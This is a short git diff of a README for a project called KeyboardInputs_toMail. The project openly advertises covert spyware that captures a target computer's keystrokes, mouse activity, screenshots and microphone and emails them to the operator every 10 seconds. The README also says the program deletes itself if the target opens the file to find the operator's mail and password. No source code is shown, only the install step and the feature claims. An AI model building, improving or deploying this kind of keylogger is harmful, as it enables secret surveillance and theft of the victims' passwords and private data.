@@ -1,5 +1,5 @@
 # KeyboardInputs_toMail
-Get Keyboard Inputs and Send to your Mail.
+Get Keyboard,Mouse,ScreenShot,Microphone Inputs and Send to your Mail.
 
 ## INSTALLATION
 
@@ -18,6 +18,6 @@ pip install pynput
 
 •**Every 10 seconds,You Get the Data from the Target Computer**
 
-•**If Target finds the Code and Open the File for Learn your MAIL and Password The Program DELETE itself.**
+•**If Target finds the Code and Open the File for Want to Learn your MAIL and Password The Program DELETE itself.**
 
 
